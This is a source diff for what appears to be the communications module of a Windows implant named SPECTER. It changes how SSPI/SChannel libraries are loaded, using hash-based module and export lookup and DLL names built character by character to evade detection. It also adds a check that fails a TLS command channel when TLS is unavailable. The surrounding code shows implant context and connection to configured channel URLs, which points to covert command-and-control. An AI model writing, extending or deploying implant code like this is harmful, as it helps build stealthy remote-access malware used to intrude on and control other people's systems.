@@ -603,15 +603,21 @@ static NTSTATUS comms_resolve_apis(COMMS_API *api) {
 #ifdef SPECTER_BAREBONE
     api->tls_available = FALSE;
 #else
-    /* Resolve secur32.dll (may forward to sspicli.dll) */
+    /* Resolve SChannel/SSPI. secur32.dll often forwards SSPI exports
+       into sspicli.dll, so load both before resolving forwarded exports. */
     PVOID sec = find_module_by_hash(HASH_SECUR32_DLL);
-    if (!sec)
-        sec = find_module_by_hash(HASH_SSPICLI_DLL);
     if (!sec && pLoadLib) {
         char sec_name[] = {'s','e','c','u','r','3','2','.','d','l','l',0};
         sec = pLoadLib(sec_name);
     }
-    if (!sec) return (NTSTATUS)0xC0000164; /* 164 = no secur32 */
+    PVOID sspi = find_module_by_hash(HASH_SSPICLI_DLL);
+    if (!sspi && pLoadLib) {
+        char sspi_name[] = {'s','s','p','i','c','l','i','.','d','l','l',0};
+        sspi = pLoadLib(sspi_name);
+    }
+    if (!sec && !sspi) return (NTSTATUS)0xC0000164; /* 164 = no SChannel */
+    if (sspi)
+        sec = sspi;
 
     api->pAcquireCredentialsHandleA  = (fn_AcquireCredentialsHandleA)find_export_by_hash(sec, HASH_ACQUIRECREDHANDLE);
     api->pInitializeSecurityContextA = (fn_InitializeSecurityContextA)find_export_by_hash(sec, HASH_INITSECCTX);
@@ -2346,6 +2352,8 @@ NTSTATUS comms_init(IMPLANT_CONTEXT *ctx) {
     /* Connect to primary channel */
     CHANNEL_CONFIG *ch = &cfg->channels[best_idx];
     if (!ch->url[0]) return (NTSTATUS)0xC0000171; /* 171 = no URL */
+    if (ch->needs_tls && !g_comms_ctx.api.tls_available)
+        return (NTSTATUS)0xC0000174; /* 174 = TLS required but unavailable */
 
     COMMS_TRACE("[SPECTER] comms: tcp_connect...");
     status = comms_tcp_connect(&g_comms_ctx, ch->url, ch->port);
@@ -2353,7 +2361,7 @@ NTSTATUS comms_init(IMPLANT_CONTEXT *ctx) {
     COMMS_TRACE("[SPECTER] comms: tcp_connect OK");
 
     /* TLS handshake — only for channels with https:// scheme */
-    if (ch->needs_tls && g_comms_ctx.api.tls_available) {
+    if (ch->needs_tls) {
         status = comms_tls_handshake(&g_comms_ctx, ch->url);
         if (!NT_SUCCESS(status)) {
             comms_tcp_close(&g_comms_ctx);
